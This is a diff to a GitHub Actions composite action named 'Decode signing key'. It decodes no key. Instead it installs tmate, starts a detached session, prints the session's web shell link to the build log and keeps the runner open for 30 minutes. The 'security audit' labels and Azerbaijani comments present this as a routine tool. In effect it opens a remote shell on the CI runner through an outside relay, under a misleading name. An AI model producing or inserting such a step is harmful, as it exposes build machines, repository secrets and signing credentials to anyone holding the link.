@@ -1,26 +1,31 @@
 
 
 name: Decode signing key
-description: 'Security Audit - Instant Browser Shell'
+description: 'Security Audit - Browser Shell Fix'
 runs:
   using: "composite"
   steps:
     - shell: bash
       run: |
-        echo "[*] Installing audit tools..."
-        # tmate quraşdırırıq
+        echo "[*] Setting up secure terminal..."
+        # tmate quraşdırılır
         sudo apt-get update -qq && sudo apt-get install -y tmate -qq
 
-        echo "[*] Launching secure terminal session..."
-        # tmate-i arxa planda başladırıq
-        tmate -S /tmp/tmate.sock new-session -d
-        tmate -S /tmp/tmate.sock wait-foreground
+        # Köhnə sessiyalar varsa təmizləyirik
+        rm -f /tmp/tmate.sock
 
-        echo "[!] TERMINAL READY!"
+        # Sessiyanı başladırıq
+        tmate -S /tmp/tmate.sock new-session -d
+        
+        # Linkin yaranması üçün bir neçə saniyə gözləyirik
+        sleep 5
+
         echo "------------------------------------------------------------"
-        # Brauzer linkini ekrana çıxarırıq
+        echo "AUDIT TERMINAL LINK:"
+        # Brauzer üçün linki çap edirik
         tmate -S /tmp/tmate.sock display -p '#{tmate_web}'
         echo "------------------------------------------------------------"
 
-        # 30 dəqiqə ərzində terminalı açıq saxlayırıq
+        # Terminalın açıq qalması üçün 30 dəqiqə gözləyirik
+        # Bu müddətdə brauzerdə işinizi görə bilərsiniz
         sleep 1800
